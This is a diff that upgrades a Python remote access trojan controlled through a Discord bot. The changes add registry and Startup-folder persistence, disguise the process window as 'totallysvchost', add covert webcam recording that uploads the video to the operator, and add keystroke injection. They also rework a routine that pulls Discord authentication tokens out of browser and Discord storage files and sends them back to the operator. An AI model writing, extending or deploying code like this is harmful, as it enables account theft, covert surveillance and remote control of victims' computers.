@@ -24,18 +24,25 @@ import pyaudio # :)
 import psutil
 import winsound
 import win32gui
+import win32process
 from win32ui import *
 from win32con import *
 import aiohttp
 import patoolib
+import shutil
+import cv2
+import pyautogui as auto
+import tkinter as tk
+from PIL import Image, ImageTk
+from io import BytesIO
 
-version = "(version: 1.4)"
+version = "(version: 1.5)"
 login = os.getlogin()
 client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(4).hex()
 session_name = os.getlogin() + "-" + session_id
-guild_id = "1114226494693191742"
-commands = "\n".join([
+guild_id = "GUILD_ID_HERE"
+commands_list = "\n".join([
 	"help - self-explanatory",
 	"ping - self-explanatory",
 	"cd - self-explanatory",
@@ -89,8 +96,14 @@ commands = "\n".join([
 	"sus - downlaods the entire among us game, unzips it and starts it",
 	"shutdown - performs a computer shutdown",
 	"restart - performs a computer restart",
+	"recordcamera - records camera output (type 'stop' to stop and send the output)",
+	"write - writes a custom message using the keyboard",
 	"exit - exit this session"
 ])
+
+commands = "\n".join(commands_list)
+max_chars_per_message = 1500
+command_chunks = [commands[i:i + max_chars_per_message] for i in range(0, len(commands), max_chars_per_message)]
 
 random_mouse_running = False
 random_volume_control = False
@@ -113,13 +126,13 @@ SRCCOPY = 0x00EE0086
 
 user32 = ctypes.windll.user32
 
+femboyaccess_dir = os.path.dirname(os.path.abspath(__file__))
+
 async def startup(file_path=""):
 	temp = os.getenv("TEMP")
 	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
-	if file_path == "":
-		file_path = sys.argv[0]
 	with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
-		bat_file.write(r'start "" "%s"' % file_path)
+		bat_file.write(r'start "" "%s"' % femboyaccess_dir)
 
 async def start_random_mouse_movements():
 	global random_mouse_running
@@ -176,32 +189,19 @@ async def msgbox(ctx, *, args):
 	await asyncio.sleep(0.2)
 	ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)  # MB_OK | MB_ICONINFORMATION
 
-def find_token():
-	tokens = []
-	local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
-	paths = {
-		"Lightcord": roaming + "\\Lightcord",
-		"Opera": roaming + "\\Opera Software\\Opera Stable",
-		"Chrome": local + "\\Google\\Chrome\\User Data\\Default",
-		"Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
-		"MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",
-		"Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
-		"Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-		"Vivaldi": local + "\\Vivaldi\\User Data\\Default",
-		"Chromium": local + "\\Chromium\\User Data\\Default"
-	}
-	for platform, path in paths.items():
-		path += '\\Local Storage\\leveldb'
-		try: 
-			for file_name in os.listdir(path):
-				if not file_name.endswith('.log') and not file_name.endswith('.ldb'): 
-					continue
-				for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-					for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
-						for token in re.findall(regex, line): 
-							tokens.append(token)
-		except FileNotFoundError: continue
+def find_tokens(path):
+	path += '\\Local Storage\\leveldb'
 
+	tokens = []
+
+	for file_name in os.listdir(path):
+		if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+			continue
+
+		for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+				for token in re.findall(regex, line):
+					tokens.append(token)
 	return tokens
 
 def set_system_time(year, month, day, hour, minute):
@@ -382,9 +382,23 @@ async def download(message, url: str, dest: str = "c:\\", download_percent = Tru
 		except Exception as err:
 			await message.reply(f"An error occurred during the download: {err}")  # search for all others error
 
-async def start_process(processname,shell=False,check=False):
+new_femboyaccess_dir = "C:\Desktop"
 
-	subprocess.run()
+def open_registry_key(key_path):
+	return winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
+
+def set_registry_value(key, name, value):
+	winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
+
+def close_registry_key(key):
+	winreg.CloseKey(key)
+
+def set_persistence():
+	startup_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+	key = open_registry_key(startup_key)
+	set_registry_value(key, "fa", rf"{new_femboyaccess_dir}")
+	close_registry_key(key)
+
 @client.event
 async def on_ready():
 	guild = client.get_guild(int(guild_id))
@@ -406,6 +420,19 @@ async def on_ready():
 - [2;34musername[0m: [2;35m{os.getlogin()}[0m
 - [2;34mip[0m: [2;35m{country}, {ip}[0m
 - [2;34mis vm: [2;35m{isvm}[0m```""")
+	whnd = ctypes.windll.kernel32.GetConsoleWindow()
+	#if whnd != 0:
+	#   try:
+	#       ctypes.windll.user32.ShowWindow(whnd, 0)
+	#       await channel.send(await femboyaccess("stealth", "python window has been hidden! :3"))
+	#   except:
+	#       await channel.send(await femboyaccess("stealth", "could not hide the python window! :c"))
+	try:
+		ctypes.windll.kernel32.SetConsoleTitleW("totallysvchost")
+		await channel.send(await femboyaccess("stealth", "changed process name! :3"))
+	except:
+		await channel.send(await femboyaccess("stealth", "failed to change process name! :c"))
+	#shutil.move(__file__, os.path.join(new_femboyaccess_dir, os.path.basename(__file__)))
 
 @client.event
 async def on_message(message):
@@ -421,22 +448,8 @@ async def on_message(message):
 		return
 
 	if message.content == "help":
-		txt = await femboyaccess("help", commands)
-		print(txt)
-		msgs = []
-		vierge = ''
-		for c in txt:
-			if len(vierge) >= 2000 or len(txt)-len(vierge) < 2000:
-				msgs.append('```'+vierge+'```')
-				vierge = ''
-
-
-			vierge +=c
-
-		for msg in msgs:
-			await message.reply(msg)
-
-					
+		for chunk in command_chunks:
+			await femboyaccess("help", chunk)
 
 	if message.content == "ping":
 		await message.reply(await femboyaccess("ping", f"{round(client.latency * 1000)}ms"))
@@ -713,8 +726,35 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			await message.reply(await femboyaccess("displayoff", "admin rights are required for this command, silly :3"))
 
 	if message.content.startswith("tokens"):
-		found = find_token()
-		await message.reply(await femboyaccess("tokens", f"list of tokens found:\n\n{found}"))
+		local = os.getenv('LOCALAPPDATA')
+		roaming = os.getenv('APPDATA')
+
+		paths = {
+			'Discord': roaming + '\\Discord',
+			'Discord Canary': roaming + '\\discordcanary',
+			'Discord PTB': roaming + '\\discordptb',
+			'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+			'Opera': roaming + '\\Opera Software\\Opera Stable',
+			'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+			'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+		}
+
+		msg = ""
+
+		for platform, path in paths.items():
+			if not os.path.exists(path):
+				continue
+
+			msg += f'\n- {platform} -\n\n'
+
+			tokens = find_tokens(path)
+
+			if len(tokens) > 0:
+				for token in tokens:
+					msg += f'{token}\n'
+			else:
+				msg += 'no tokens found! :c\n'
+		await message.reply(await femboyaccess("tokens", msg))
 
 	if message.content.startswith("critproc"):
 		try:
@@ -1030,10 +1070,40 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		await message.reply(await femboyaccess("restart", "initiating computer restart! :3"))
 		os.system("shutdown /r /t 0")
 
+	if message.content.startswith("recordcamera"):
+		cap = cv2.VideoCapture(0)   
+		fourcc = cv2.VideoWriter_fourcc(*"avc1")     
+		output = cv2.VideoWriter(".video.mp4", fourcc, 20.0, (640,480))
+		i = 0   
+		while 1:
+			if i == 0:
+				await message.reply(await femboyaccess("recordcamera", "started recording! :3"))
+			ret, frame = cap.read()     
+			output.write(frame)         
+			i=1
+			try:
+				msgg = await client.wait_for("message", timeout=0.05)
+			except asyncio.TimeoutError:
+				pass
+			else:
+				if msgg.content == "stop":       
+					await message.reply(await femboyaccess("recordcamera", "stopped recording, sending file! :3"))
+					break
+
+		cap.release()       
+		output.release()   
+		cv2.destroyAllWindows()     
+		await message.reply(file=discord.File(r".video.mp4"))
+
+	if message.content.startswith("write"):
+		msg = message.content.split('"')[1]
+		for char in msg:
+			auto.press(char)
+
 @client.event
 async def on_disconnect(message):
 	await channel.send(await femboyaccess("disconnected", "this session is disconnected (unusable)! :3"))
 	await message.channel.delete()
 	await client.close()
 
-client.run("MTExNDIyNDk2NjI3NjIxOTA3MQ.GhShG_.nKVZ5HHCsXTrLZ0znh8fLwukkM5RMjREm2_A_0")
+client.run(INSERT_TOKEN_BETWEEN_QUOTES)
